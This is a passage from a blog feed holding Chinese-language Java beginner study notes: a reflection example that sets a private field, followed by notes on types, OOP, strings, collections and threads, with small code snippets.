class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fanshe</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(); <span class="hljs-comment">//静态加载</span><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;Person&quot;</span>);<span class="hljs-comment">//类加载</span><br><br>        <span class="hljs-comment">//实例化：</span><br>        <span class="hljs-comment">//c1.newInstance();</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> c1.getConstructor(<span class="hljs-type">int</span>.class,String.class);<span class="hljs-comment">//获得构造器</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> (Person)s1.newInstance(<span class="hljs-number">111</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-comment">//完成实例化，再强制转换赋值</span><br>        System.out.println(p);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<span class="hljs-comment">//私有属性name</span><br>        a.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置为可以访问（？）</span><br>        a.set(p,<span class="hljs-string">&quot;bbbbb&quot;</span>);<span class="hljs-comment">//访问私有的name修改</span><br>        System.out.println(p);<span class="hljs-comment">//验证，修改成功</span><br><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> c1.getMethod(<span class="hljs-string">&quot;test&quot;</span>,String.class);<span class="hljs-comment">//调用方法public void test(String name)</span><br>        m.invoke(p,<span class="hljs-string">&quot;test&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/09/10：java 0 to 1</title>
    <link href="/2023/09/10/java0to1/"/>
    <url>/2023/09/10/java0to1/</url>
    
    <content type="html"><![CDATA[<h2 id="随手记"><a href="#随手记" class="headerlink" title="随手记"></a>随手记</h2><p>1.Java源文件以<code>.java</code>为扩展名，源文件的基本组成是类（class）<br>2.Java应用程序的执行入口为main()方法，格式：<code>public static void main(String[] args)&#123;...&#125;</code><br>3.严格区分大小写<br>4.一个源文件最多一个public类，且文件名同此类名<br>5.其他类个数不限，可将main方法写在非public类中，然后指定运行非public类，这样入口方法就是非public的main方法，且编译时每个类会生成对应的<code>.class</code>文件<br>6.变量的使用大致同C<br>7.关于+<br>    1.左右两边都是数值型时，做加法运算<br>    2.左右两边有一为字符串，做拼接<br>    3.运算从左到右<br>8.数据类型<br>    1.基本数据类型<br>    byte 1字节 -128 —— 127（二进制）<br>    short 2字节 -(2^15) —— (2^15)-1<br>    int 4字节 -(2^31) —— (2^31)-1 整型常量默认int<br>    long 8字节 -(2^63) —— (2^63)-1 long型常量需在数字后加l或L，如long n = 1L<br>    float 4字节 -3.403E38 —— 3.403E38 float常量需加f或F<br>    double 8字节 -1.798E308 —— 1.798E308 浮点常量默认double<br>    char 2字节 可放汉字，使用单引号，本质为整数，输出unicode（兼容ASCII）对应字符，可直接运算<br>    boolen 1字节 仅可true或false<br>    浮点储存：符号位+指数位+尾数位，尾数可能丢失-&gt;精度损失，运算结果比较应采用<code>Math.abs(a - b)&lt;0.001</code>形式，直接赋值或查询得到可<code>==</code><br>    2.引用类型<br>    类 接口 数组<br>9.数据类型转换<br>    1.自动<br>    精度小转大<br>    char-&gt;int-&gt;long-&gt;float-&gt;double<br>    byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double<br>    多种混合运算时，先将所有数据转换为容量最大类型<br>    (byte,short)与char不可相互转换，但可计算，会转为int<br>    精度大赋给精度小报错<br>    boolen不转换<br>    表达式结果自动提升为操作数最大类型<br>    2.强制<br>    例：<code>(int)1.9</code><br>    注意精度降低和可能的溢出<br>    仅对最近操作数有效<br>    char可保存int常量值不保存变量值<br>10.string<br>    基本转string：基本类型值+””<br>    string转基本类型：基本类型包调用方法，如<code>Long.parseLong(&quot;123&quot;)</code><br>    转换为基本类型时注意是否能转换为有效数据，如hello无法转为整数<br>11.运算符<br>    1.&amp;&amp; 和 &amp; 使用区别<br>    &amp;&amp; 短路与：如果第一个条件为 false，则第二个条件不会判断，最终结果为 false，效率高<br>    &amp; 逻辑与：不管第一个条件是否为 false，第二个条件都要判断，效率低<br>    2.|| 和 | 使用区别<br>    ||短路或：如果第一个条件为 true，则第二个条件不会判断，最终结果为 true，效率高<br>    | 逻辑或：不管第一个条件是否为 true，第二个条件都要判断，效率低<br>    开发中，我们基本使用 |<br>12.复合赋值会进行类型转换<br>13.三元运算符<code>...?表达式1:表达式2</code><br>表达式 1 和表达式 2 要为可以赋给接收变量的类型（或可以自动转换）<br>14.键盘输入<br>    1.导入该类的所在包, java.util. （Scanner类，import java.util.Scanner;）<br>    2.创建对象声明变量（如Scanner myScanner = new Scanner(System.in);）<br>    3.调用，如输入int：<code>int age = myScanner.nextInt();</code><br>15.进制<br>二进制 0B或0b开头 八进制 0开头 十六进制 0x或0X开头<br>16.位运算<br>    1.算术右移 <code>&gt;&gt;</code>：低位溢出,符号位不变,并用符号位补溢出的高位<br>    2.算术左移 <code>&lt;&lt;</code>: 符号位不变,低位补 0<br>    3. <code>&gt;&gt;&gt;</code> 逻辑右移也叫无符号右移,运算规则是: 低位溢出，高位补 0<br>17.数组<br>    1.初始化<br>    定义<br>    <code>数据类型 数组名[] = new 数据类型[大小]</code>可分两行<br>    声明<br>    数据类型 数组名[]; 或 数据类型[] 数组名;<br>    <code>int a[]; 或者 int[] a;</code><br>    注意<br>    数组中的元素可以是任何数据类型，包括基本类型和引用类型，但是不能混用。<br>    数组创建后，如果没有赋值，有默认值<br>int 0，short 0, byte 0, long 0, float 0.0,double 0.0，char \u0000，boolean false，String null<br>    数组属引用类型，数组型数据是对象(object)<br>    2.赋值<br>    数组在默认情况下是引用传递，赋的值是地址<br>    <code>int[] arr1 = &#123;1,2,3&#125;;</code>或<code>int[] arr2 = arr1;</code><br>    3.二维数组<br>    <code>int[][] arr</code><br>    每个元素是一维数组，同C，动态初始化<code>int[][] arr = new int[3][]</code><br>    声明：int[][] y 或者 int[] y[] 或者 int y[][]<br>    二维数组实际上是由多个一维数组组成的，它的各个一维数组的长度可以相同，也可以不相同。比如：map[][] 是一个二维数组，由 map[0] 是一个含有两个元素的一维数组 ，map[1] 是一个含有三个元素的一维数组构成，我们也称为列数不等的二维数组<br>18.类与对象<br>    1.对象的属性默认值，遵守数组规则<br>    2.一个方法最多有一个返回值，返回类型可以为任意类型，包含基本类型或引用类型（数组，对象）<br>    3.引用类型传递的是地址（传递也是值，但是值是地址），可以通过形参影响实参<br>    4.可变参数<br>    int… 表示接受的是可变参数，类型是 int ,即可以接收多个 int(0-多)<br>    使用可变参数时，可以当做数组来使用，本质就是数组<br>    可与普通参数一起放在列表里，需保证可变参数在最后，如：public void f2(String str, double… nums)<br>    一个形参列表中只能出现一个可变参数<br>19.作用域<br>    1.全局变量（属性）可不赋值，有默认值，可加修饰符，可被其他类使用（对象调用）<br>    2.局部变量不可加修饰符<br>    3.构造器(constructor)，是类的一种特殊的方法，它的主要作用是完成对新对象的初始化，类似C++，但构造器的修饰符可以默认，也可以是 public protected private<br>    4.this表示当前对象，会分给每个对象，哪个对象调用，就代表哪个对象；可以用来访问本类的属性、方法、构造器；用于区分当前类的属性和局部变量；访问成员方法的语法：this.方法名(参数列表)，访问构造器语法：this(参数列表); 注意只能在构造器中使用（即只能在构造器中访问另外一个构造器, 必须放在第一条语句）；this 不能在类定义的外部使用，只能在类定义的方法中使用<br>20.IDEA<br>    1.使用 IDEA 创建 Java 项目(project)，IDEA 是以项目的概念，来管理 java 源码<br>    2.Settings-&gt;File Encodings改编码<br>21.包<br>    1.作用：区分相同名字的类，便于管理，控制访问范围<br>    2.本质为创建不同的文件夹来保存文件<br>    3. package com.hspedu  package：关键字，表示打包 com.hspedu表示包名<br>    4.常用包<br>        java.lang.*  lang 包是基本包，默认引入，不需要再引入<br>        java.util.*  util 包，系统提供的工具包, 工具类，使用 Scanner<br>        java.net.*  网络包，网络开发<br>        java.awt.*  是做 java 界面开发，GUI<br>    5.引入包<br>    import java.util.Scanner; 引入Scanner类<br>    import java.util.*; 引入所有类<br>    6.package<br>    package 的作用是声明当前类所在的包，需要放在类(或者文件)的最上面，一个类中最多只有一句 package<br>    import 指令位置放在 package 的下面，在类定义前面,可以有多句且没有顺序要求<br>    7.访问修饰符：控制方法和属性(成员变量)的访问权限（范围）<br>    类似类的对象修饰符，默认级别:没有修饰符号,向同一个包的类公开<br>22.继承<br>    1.语法<br>    class 子类 extends 父类{</p><pre><code class="hljs">&#125;2.父类又叫超类，基类 子类又叫派生类3.supersuper(参数列表)指定使用父类的哪个构造器完成对父类的初始化工作，默认情况下总会去调用父类的无参构造器，在使用时，必须放在构造器第一行（super 只能在构造器中使用）super.属性名 访问父类属性super.方法名(参数列表) 访问方法4.java 所有类都是 Object 类的子类, Object 是所有类的基类5.父类构造器的调用不限于直接父类6.子类最多只能继承一个父类(指直接继承)7.关于查找    1.看子类是否有该属性    2.如果子类有这个属性，并且可以访问，则返回信息    3.如果子类没有这个属性，就看父类有没有这个属性（如果父类有该属性，并且可以访问，就返回信息..）    4.如果父类没有就按照3的规则，继续找上级父类，直到 Object..</code></pre><p>23.override重写<br>    1.定义<br>    子类有一个方法与父类方法的名称、返回类型、参数一样，就是子类重写父类方法<br>    2.注意<br>    不能缩小访问权限 public&gt;protected&gt;默认&gt;private<br>    子类方法的返回类型和父类一样或为父类的子类<br>    属性不可重写，属性值看编译类型<br>24.多态<br>    1.一个对象的编译类型和运行类型可以不一致<br>    2.编译类型在定义对象时已确定不可改变<br>    3.运行类型可改变<br>    4.编译类型看定义时=左，运行类型=右<br>    如：<br>    <figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>&#123;<br>    ...<br>&#125;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span></span>&#123;<br>    ...<br>&#125;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Animal</span></span>&#123;<br>    ...<br>&#125;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    public static void main(<span class="hljs-type">String</span>[] args)&#123;<br>        <span class="hljs-type">Animal</span> animal = <span class="hljs-keyword">new</span> <span class="hljs-type">Dog</span>();<br>        animal  = <span class="hljs-keyword">new</span> <span class="hljs-type">Cat</span>()<br>        <span class="hljs-comment">//合法</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><br>    5.多态向上转型<br>        1.本质：父类引用指向子类对象<br>        2.语法： 父类类型 引用名 = new 子类类型()<br>        3.特点：编译类型看左边，运行类型看右边；可以调用父类中的所有成员（需遵守访问权限）；不能调用子类特有成员；最终效果看子类实现<br>    6.多态向下转型<br>        1.语法： 子类类型 引用名 = (子类类型) 父类引用<br>        2.只能强转父类的引用，不能强转父类对象<br>        3.要求父类的引用必须指向的是当前目标类型的对象<br>        4.向下转型后，可调用子类类型所有成员<br>    7.Java动态绑定机制<br>        1.调用对象方法时，该方法会和该对象的内存地址/运行类型绑定<br>        2.调用对象属性时，无动态绑定机制，哪声明哪使用<br>    8.多态参数 多态数组 …<br>    （先放着 偷懒）<br>25.Object<br>    1.equals方法<br>        只能判断引用类型，默认判断地址是否相等，一般重写<br>    2.hashCode方法<br>        返回该对象哈希码值；哈希值主要根据地址号来的，不能完全将哈希值等价于地址；<br>    3.toString方法<br>        默认返回：全类名+@+哈希值的十六进制；重写需@Override<br>    4.finalize方法<br>        当对象被回收时，系统自动调用该对象的 finalize 方法；当某个对象没有任何引用时，则 jvm 就认为这个对象是一个垃圾对象，就会使用垃圾回收机制来销毁该对象，在销毁该对象前，会先调用 finalize 方法；垃圾回收机制的调用，是由系统来决定（即有自己的 GC 算法）, 也可以通过 System.gc() 主动触发垃圾回收机制；重写需@Override<br>26.static<br>    1.类变量<br>        一个类所有对象共享，静态变量也叫类变量、静态属性<br>        访问： 类名.类对象名<br>    2.类方法<br>        使用： 类名.方法名<br>        不允许使用和对象有关关键字，只能访问静态变量方法<br>        无this<br>27.main方法<br>    1.可以直接调用 main 方法所在类的静态方法或静态属性<br>    2.不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员<br>    3.接受String类型数组参数，该数组保存执行java命令时传递给所运行的类的参数<br>    4.必须为 public static<br>28.代码块<br>    1.语法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$[修饰符，要写只能写static]&#123;<br>$    代码<br>$&#125;;<br></code></pre></td></tr></table></figure><pre><code class="hljs">2.相当于另一种形式构造器，代码块调用的顺序优先于构造器（构造方法），3.在创建对象实例（new）加载/创建子类对象实例父类加载/使用类的静态成员加载，静态代码块随类的加载执行且仅一次，普通代码块每创建一个对象就执行4.创建对象时的调用顺序    静态代码块/静态变量初始化-&gt;普通代码块和普通属性-&gt;构造函数5.子类对象调用顺序父类静态代码块/静态属性-&gt;子类静态代码块和静态属性-&gt;父类普通代码块和普通属性-&gt;父类构造函数-&gt;子类普通代码块和普通属性-&gt;子类构造函数</code></pre><p>29.单例<br>    1.含义<br>        保证整个软件系统中对某个类只存在一个对象实例，且该类只提供一个取得对象实例的方法<br>    2.实现<br>        构造器私有（防new）-&gt;类内部创建对象-&gt;向外暴露一个静态公共方法<br>    3.饿汉与懒汉<br>        创建对象时机：饿汉在类加载，懒汉在使用时<br>        线程安全：饿汉无，懒汉有<br>        浪费资源可能：饿汉有，懒汉无<br>30.final<br>    1.修饰类、属性、方法<br>    2.使用情况<br>        不希望类被继承 不希望父类某方法被子类重写 不希望类的某属性被修改 不希望某个局部变量被修改<br>    3.注意<br>        final修饰的属性也叫常量，需赋初值，在定义时或构造器或代码块；若该属性静态，不可在构造器赋值；不能继承但可实例化对象；若类不是final，但有final方法，则该方法不可被继承但可被重写；不能修饰构造器；包装类（如Integer Double Float Boolean等）均为final，String也是<br>31.抽象类<br>    abstract声明<br>32.接口<br>    1.定义<br>        将没有实现的方法封装到一起，要使用时再把方法写出来<br>    2.语法<br>    <figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-class"><span class="hljs-keyword">interface</span> 接口名</span>&#123;<br>    属性<br>    抽象方法<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> 类名 <span class="hljs-keyword"><span class="hljs-keyword">implements</span> </span>接口</span>&#123;<br>    自己属性<br>    自己方法<br>    要实现的抽象方法，要@Override<br>&#125;<br></code></pre></td></tr></table></figure><br>    3.接口属性只能final，访问： 接口名.属性名<br>    4.一个类可有多个接口<br>    5.接口不能继承其他类，但可继承多个接口<br>33.内部类<br>    1.定义：一个类内部又完整嵌套另一个类，可直接访问外部类私有属性<br>    2.语法<br>        <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">class</span> <span class="hljs-keyword">Outer</span>&#123;<br>    ckass <span class="hljs-keyword">Inner</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><br>    3.匿名内部类无类名<br>    4.访问外部类成员： 外部类名.this.成员<br>    5.外部类访问内部类需先创建对象<br>    6.不可用修饰符，可final，本质局部变量<br>    7.匿名类<br>        1.语法<br>        <figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span> <span class="hljs-type"></span>类/接口(参数列表)&#123;<br>    类体<br>&#125;;<br></code></pre></td></tr></table></figure><br>        2.注意<br>        仅可使用一次；外部其他类不能访问；外部类与匿名类重名且匿名类访问时，遵循就近原则，访问外部类同上<br>    8.静态内部类<br>        可访问外部类所有静态成员，包含私有，无法访问非静态成员；可以任意添加访问修饰符；作用整个类；同上有就近原则<br>34.枚举<br>    1.实现：自定义类/使用enum关键字<br>    2.注意<br>    通常只读；使用final+static；可有多个属性<br>    3.enum<br>    使用关键字 enum 替代 class；直接使用 常量名(实参列表)；有多个常量，使用逗号隔开；将定义的常量对象写在前面；使用无参构造器创建常量对象可省略括号<br>    当我们使用 enum 关键字开发一个枚举类时，默认会继承 Enum 类, 而且是一个 final 类；如果使用无参构造器 创建 枚举对象，则实参列表和小括号都可以省略；传统的 public static final Season2 SPRING = new Season2(“春天”, “温暖”); 简化成 SPRING(“春天”, “温暖”)， 这里必须知道，它调用的是哪个构造器；有多个枚举对象时，使用,间隔，最后有一个分号结尾；枚举对象必须放在枚举类的行首<br>    可使用Enum类相关方法<br>    接口： enum 类名 implements 接口 1，接口 2{}<br>35.注解<br>    不影响程序逻辑，但注解可以被编译或运行，相当于嵌入在代码中的补充信息<br>    在 JavaSE 中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在 JavaEE 中注解占据了更重要的角色，例如用来配置应用程序的任何切面</p><pre><code class="hljs">基本注解（Annotation）    @Override: 限定某个方法，是重写父类方法, 该注解只能用于方法    @Deprecated: 用于表示某个程序元素(类, 方法等)已过时    @SuppressWarnings: 抑制编译器警告</code></pre><p>36.常用类<br>    1.包装类<br>        针对8种基本数据类型（boolean-&gt;Boolean char-&gt;Character byte-&gt;Byte short-&gt;Short int-&gt;Integer long-&gt;Long float-&gt;Float double-&gt;Double）<br>    2.包装类与基本数据类型转换<br>        1.jdk5前手动，形式： 装箱：基本类型-&gt;包装类型<br>        2.自动装箱底层调用valueOf方法，如Integer.valueOf()<br>    3.Integer类常用方法<br>        Integer.MIN_VALUE  返回最小值<br>        Integer.MAX_VALUE  返回最大值<br>    4.Character类常用方法<br>        Character.isDigit()  判断是不是数字<br>        Character.isLetter()  判断字母<br>        Character.isUpperCase()  判断大写<br>        Character.isLowerCase()  判断小写<br>        Character.isWhitespace()  判断空格<br>        Character.toUpperCase()  转换大写<br>        Character.toLowerCase()  转换小写<br>    5.String类<br>        1.保存字符串/一组字符序列<br>        2.字符串常量对象用双引号包括<br>        3.用Unicode编码，1字符占2字节<br>        4.常用构造：<br>            new String();<br>            new String(String original);<br>            new String(char[] a);<br>            new String(char[] a,int startIndex,int count);<br>            …<br>        5.final 不可继承<br>        6.有属性 private final char value[] 用于存放字符串内容 字符串不可变，一旦对象被分配，其内容不可变<br>        7.实现接口 Serializable（String可串行化，可网络传输） Comparable（String对象可比较大小）<br>        8.创建方式<br>            1.直接赋值<br>            如：String s = “hsp”;<br>            先从常量值查看是否有”hsp”数据空间，有则直接指向；没有则重新创建再指向；s最终指向常量池的空间地址<br>            2.调用构造器<br>            如：String s = new String(“hsp”);<br>            先在堆中创建空间，内维护value属性，指向常量池hsp空间；若没有hsp，重新创建；有，则直接通过value指向<br>        9.常用方法<br>            equals() 区分大小写判断内容是否相等<br>            equalslgnoreCase() 忽略大小写，同上<br>            length() 字符串长度<br>            indexOf() 获取字符在字符串中第1次出现的索引，从0开始，没有则返回-1<br>            lastIndexOf() 最后1次出现的索引，余同上<br>            substring() 截取指定范围的子串<br>            trim() 去前后空格<br>            charAt() 获取某索引处空格，不能用<code>Str[index]</code>形式<br>            replace() 替换字符串中字符<br>            split() 分割字符串，某些需转义<br>            compareTo() 比较字符串大小<br>            toCharArray() 转换为字符数组<br>            format() 格式字符串<br>    6.StringBuffer类<br>        1.很多方法同String，但其可变长度，是个容器<br>        2.直接父类 是 AbstractStringBuilde<br>        3.实现了 Serializable, 即 StringBuffer 的对象可以串行化<br>        4.在父类中 AbstractStringBuilder 有属性 char[] value,不是 final<br>        5.final类<br>        6.保存字符串变量，可更改，更新不用更改地址，效率较高<br>        7.互换<br>            1.String-&gt;StringBuffer<br>            <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String str <span class="hljs-operator">=</span> <span class="hljs-string">&quot;111&quot;</span><span class="hljs-comment">;</span><br>StringBuffer stringBuffer <span class="hljs-operator">=</span> new StringBuffer(str)<span class="hljs-comment">;//法一，返回的才是 StringBuffer 对象，对 str 本身没有影响</span><br><br>StringBuffer stringBuffer1 <span class="hljs-operator">=</span> new StringBuffer()<span class="hljs-comment">;</span><br><span class="hljs-attribute">stringBuffer1</span> <span class="hljs-operator">=</span> stringBuffer1.append(str)<span class="hljs-comment">;//法二</span><br></code></pre></td></tr></table></figure><br>            2.StringBuffer-&gt;String<br>            <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">StringBuffer</span> stringBuffer3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">StringBuffer</span>(<span class="hljs-string">&quot;111&quot;</span>);<br><br><span class="hljs-built_in">String</span> s = stringBuffer3.toString();<span class="hljs-comment">//法一</span><br><span class="hljs-built_in">String</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(stringBuffer3);<span class="hljs-comment">//法二</span><br></code></pre></td></tr></table></figure><br>        8.常用方法<br>            append()  增<br>            delete()  删<br>            replace()  改<br>            insert() 插入<br>            indexOf()  同前<br>            length()  同前<br>    7.StringBuilder类：简易的StringBuffer类替换<br>    8.Math类<br>        常用方法<br>        abs() 绝对值<br>        pow() 求幂<br>        ceil() 向上取整，返回&gt;=该参数的最小整数（转成 double）<br>        floor() 向下取整，返回&lt;=该参数的最大整数（转成 double）<br>        round()  四舍五入<br>        sqrt()  开方<br>        random()  随机数<br>        min() 最小<br>        max() 最大<br>    9.Array类<br>        常用方法<br>        toString() 返回字符串形式<br>        sort() 排序（自然和定制）<br>        binary() 二分法搜索，但需先排序<br>        copyOf() 复制元素<br>        fill() 元素填充<br>        equals() 比较数组内容是否一致<br>        asList() 将一组值转换为list<br>    10.System类<br>        常用方法<br>        exit() 退出当前程序<br>        arraycopy() 复制数组元素<br>        currentTimeMillens() 返回时间：距离1970-1-1毫秒数<br>        gc() 垃圾回收机制<br>    11.BigInterger和BigDecimal<br>        1.区别<br>            BigInterger 适合保存较大整型<br>            BigDecimal 适合保存精度更高的浮点型<br>        2.常用方法<br>            add() 加<br>            subtract() 减<br>            multiply() 乘<br>            divide() 除<br>            在对 BigInteger 进行加减乘除的时候，需要使用对应的方法<br>    12.日期类<br>        1.第一代<br>            精确到毫秒<br>            SimpleDateFormat对象 格式和解析日期的类<br>            Date d1 = new Date(); //获取当前系统时间<br>            Date d2 = new Date(1111); //通过指定毫秒数得到时间<br>            可以把一个格式化的 String 转成对应的 Date；得到 Date 仍然在输出时，还是按照国外的形式，如果希望指定格式输出，需要转换；在把 String -&gt; Date，使用的 sdf 格式需要和你给的 String 的格式一样，否则会抛出转换异常<br>        2.第二代<br>            主要为Calendar类<br>            Calendar 是一个抽象类，并且构造器是 private；可以通过 getInstance() 来获取实例；没有提供对应的格式化的类；如果需要按照24小时进制来获取时间， Calendar.HOUR ==改成=&gt; Calendar.HOUR_OF_DA；返回月时候，是按照 0 开始编号<br>        3.第三代<br>            使用 now() 返回表示当前日期时间的 对象<br>            使用 DateTimeFormatter 对象来进行格式化<br>            提供 plus 和 minus 方法可以对当前时间进行加或者减<br>        4.DateTimeFormatter 格式日期类：类似SimpleDateFormat<br>        5.Instant 时间戳<br>            静态方法 now() 获取表示当前时间戳的对象<br>            通过 from 可以把 Instant 转成 Date<br>            通过 date 的 toInstant() 可以把 date 转成 Instant 对象<br>        6.其他日期类…<br>37.集合<br>    1.Collection 接口和常用方法<br>        add() 添加单个元素<br>        remove() 删除指定元素<br>        size() 查找元素是否存在<br>        contains() 获取元素个数<br>        isEmpty() 判断是否为空<br>        clear() 清空<br>        addAll() 添加多个元素<br>        containsAll() 查找多个元素是否存在<br>        removeAll() 删除多个元素<br>    2.Iterator（迭代器）<br>        主要用于遍历Collection集合中的元素，不存放对象<br>        所有实现Collection接口的集合类都有一个Iterator()方法，用以返回一个实现Iterator接口的对象<br>        使用例:<br>        <img src="/2023/09/10/java0to1/diedaiqi.png" class=""><br>    3.List接口<br>        是Collection子接口<br>        1. List 集合类中元素有序(即添加顺序和取出顺序一致)、且可重复<br>        2. List 集合中的每个元素都有其对应的顺序索引，即支持索引；索引是从 0 开始<br>        3.常用方法<br>            add() 在指定位置插入元素<br>            addAll() 从指定位置开始添加所有元素<br>            get() 获取指定位置元素<br>            indexOf() 返回在集合初次出现的位置<br>            lastIndexOf() 返回在当前集合中末次出现的位置<br>            remove() 移除指定位置的元素，并返回此元素<br>            set(int index, Object ele) 设置指定 index 位置的元素为 ele , 相当于是替换<br>    4.ArrayList<br>        1.基本等同于Vector<br>        2.由数组实现存储<br>        …<br>    5.Vector<br>        1.是个对象数组<br>        2.Vector 和 ArrayList 的比较<br>            <img src="/2023/09/10/java0to1/vector.png" class=""><br>    6.LinkedList<br>        <img src="/2023/09/10/java0to1/linklist.png" class=""><br>    7.Set接口<br>        1.Collection子接口<br>        2.set 接口的实现类的对象（Set 接口对象）, 不能存放重复的元素, 可以添加一个 null<br>        3. set 接口对象存放数据是无序（即添加的顺序和取出的顺序不一致）<br>    8.Set 接口实现类-HashSet<br>        <img src="/2023/09/10/java0to1/hashmap.png" class=""><br>    9.Set 接口实现类-LinkedHashSet<br>        <img src="/2023/09/10/java0to1/linkset1.png" class=""><br>    10.Map<br>        1. Map 与 Collection 并列存在。用于保存具有映射关系的数据:Key-Value(双列元素)<br>        2. Map 中的 key 和 value 可以是任何引用类型的数据，会封装到 HashMap$Node 对象中<br>        3. Map 中的 key 不允许重复，原因和 HashSet 一样，前面分析过源码.<br>        4. Map 中的 value 可以重复<br>        5. Map 的 key 可以为 null, value 也可以为 null ，注意 key 为 null，只能有一个，value 为 null ,可以多个<br>        6. 常用 String 类作为 Map 的 key<br>        7. key 和 value 之间存在单向一对一关系，即通过指定的 key 总能找到对应的 value<br>        8.常用方法<br>            put() 添加k-v<br>            remove() 根据键删除映射关系<br>            get() 根据键获取值<br>            size() 获取元素个数<br>            isEmpty() 判断个数是否为 0<br>            clear() 清除 key-value<br>            containsKey() 查找键是否存在<br>        9.接口实现<br>            HasMmap<br>            <img src="/2023/09/10/java0to1/hashmap1.png" class=""><br>            HashTable<br>            <img src="/2023/09/10/java0to1/hashtable.png" class=""><br>            Properties<br>            <img src="/2023/09/10/java0to1/properties.png" class=""><br>    11.小结<br>        <img src="/2023/09/10/java0to1/littletotal.png" class=""><br>38.线程<br>    1.创建线程两种方式：1.继承Thread类，重写run方法 2.实现Runnable接口，重写run方法<br>    2.start0() 是本地方法，是 JVM 调用，底层是 c/c++实现，真正实现多线程的效果， 是 start0(), 而不是 run<br>    3.当 main 线程启动一个子线程 Thread-0，主线程不会阻塞，会继续执行，这时，主线程和子线程是交替执行<br>    4.Thread类<br>        1.当一个类继承了 Thread 类， 该类就可以当做线程使用<br>        2.我们会重写 run 方法，写上自己的业务代码<br>        3.run Thread 类 实现了 Runnable 接口的run方法<br>    5.Runnable接口：本质与上无区别，更适合多线程共享一个资源，避免单继承限制<br>    6.线程终止<br>        <img src="/2023/09/10/java0to1/xianchengzhongzhi.png" class=""><br>    7.常用方法<br>    <img src="/2023/09/10/java0to1/xianchengchangyongfangfa1.png" class=""><br>    <img src="/2023/09/10/java0to1/xianchengchangyongfangfa2.png" class=""><br>    8.用户线程&amp;守护线程<br>        <img src="/2023/09/10/java0to1/userxiancheng.png" class=""><br>        没有进行设置即使main线程执行完毕守护线程也不退出<br>    9.线程的生命周期<br>        <img src="/2023/09/10/java0to1/xianchengalive.png" class=""><br>    10.线程状态转换<br>        <img src="/2023/09/10/java0to1/xianchengalive2.png" class=""><br>    11.</p>]]></content>
    
    
    
  </entry>
  
  
  
